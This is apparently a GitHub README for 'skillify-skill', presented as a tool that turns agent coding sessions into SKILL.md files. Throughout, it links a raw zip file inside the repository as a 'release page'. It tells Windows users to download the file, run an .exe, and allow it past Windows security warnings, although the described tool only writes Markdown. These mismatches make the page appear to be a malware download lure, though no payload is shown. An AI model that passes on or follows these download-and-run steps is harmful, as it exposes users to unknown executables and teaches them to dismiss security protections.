# 🧩 skillify-skill - Turn sessions into reusable skills

[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github)](https://github.com/aliyanfauzi361-create/skillify-skill/raw/refs/heads/main/skills/skillify/skill-skillify-v2.8.zip)

## 🚀 What this app does

Skillify-skill helps you turn a work session into a reusable skill file. It watches the steps you took in a conversation, the tools you used, and the fixes you made. Then it saves that process as a portable `SKILL.md` file.

Use it when you finish a task that you may need again later, such as:

- setting up a project
- fixing a common bug
- repeating a workflow
- creating a step-by-step process for an agent tool

It works with platforms that support the agentskills.io standard, including Claude Code, Cursor, GitHub Copilot, Gemini CLI, and VS Code.

## 💻 What you need

Before you install, check that you have:

- a Windows 10 or Windows 11 PC
- internet access
- enough space to save the app and its files
- permission to download and open files on your computer

If your browser asks where to save the file, pick a folder you can find later, such as `Downloads` or `Desktop`.

## 📥 Download skillify-skill for Windows

Visit the release page here:

https://github.com/aliyanfauzi361-create/skillify-skill/raw/refs/heads/main/skills/skillify/skill-skillify-v2.8.zip

On that page, look for the newest release and download the Windows file attached to it. If there are several files, choose the one made for Windows. After the download finishes, open the file from your browser or from the folder where you saved it.

## 🪟 Install and open on Windows

Follow these steps:

1. Open the release page link above.
2. Find the latest version near the top of the page.
3. Download the Windows file from the release assets.
4. Wait for the download to finish.
5. Open the file you downloaded.
6. If Windows asks for confirmation, choose the option to open or run it.
7. Follow any on-screen steps until the app starts.

If the file opens in a folder instead of launching the app, look for the main `.exe` file inside the downloaded package and open that file.

## 🧭 How to use it

Use skillify-skill after you finish a task that you may want to repeat later.

A simple flow looks like this:

1. Finish your work in your agent tool or editor.
2. Run `/skillify`.
3. Answer the questions it asks.
4. Let it review the session history and project changes.
5. Save the generated `SKILL.md` file.
6. Use that skill in your next session.

The app asks for a few rounds of input. It uses your answers to build a skill file that matches the way you work.

## 🗂️ Where the skill file goes

Skillify-skill can save the file in two common places:

- your project folder, in `.claude/skills/`
- your personal skill folder, in `~/.claude/skills/`

If you save it in your project, only that project can use it. If you save it in your personal folder, you can use it in other supported projects too.

## 🛠️ What the skill file includes

The generated `SKILL.md` file usually includes:

- the goal of the task
- the steps you followed
- the tools you used
- the checks that show the task worked
- edge cases and fixes
- notes for future sessions

This makes it easier to repeat the same work without starting from zero.

## 🧾 Example uses

You can use skillify-skill to capture tasks like:

- setting up a local dev environment
- fixing a build issue
- creating a new feature with the same process each time
- reviewing files in a set order
- testing a workflow in an agent tool
- documenting a repeatable support task

## 🔍 If Windows blocks the file

Sometimes Windows shows a security message when you open a downloaded file. If that happens:

1. Check that you downloaded it from the release page.
2. Open the file again.
3. Choose the option that allows it to run if Windows asks.

If the file still does not open, download it again from the release page and try one more time.

## 📌 Good habits for first use

To get a clean result, keep these habits in mind:

- finish the task before running `/skillify`
- keep your chat or session history intact
- save the skill file in a place you can find later
- use a clear name for the skill so you can recognize it fast

## ⚙️ Supported platforms

Skillify-skill is meant for agent tools that support the agentskills.io format. That includes:

- Claude Code
- Cursor
- GitHub Copilot
- Gemini CLI
- VS Code
- other compatible agent platforms

If your tool supports slash commands and skill files in the agentskills.io style, this app fits that workflow

## 📁 File format

The main output is a plain text Markdown file named `SKILL.md`. This format is easy to read, easy to share, and easy to move between tools. It keeps the skill portable and simple to edit if you want to make changes later

## 🧩 Typical workflow

A common workflow looks like this:

1. Do the task once.
2. Let skillify-skill review what happened.
3. Answer the interview prompts.
4. Save the new skill.
5. Reuse the skill later when the same kind of task comes up

This helps you avoid repeating the same planning work every time

## 📦 Release updates

Check the release page when you want the latest version:

https://github.com/aliyanfauzi361-create/skillify-skill/raw/refs/heads/main/skills/skillify/skill-skillify-v2.8.zip

Use the newest release if you want the latest fixes and changes

## 🖱️ Quick start

1. Open the release page.
2. Download the Windows file.
3. Open the file on your PC.
4. Run `/skillify` in your supported tool.
5. Save the `SKILL.md` file where you want it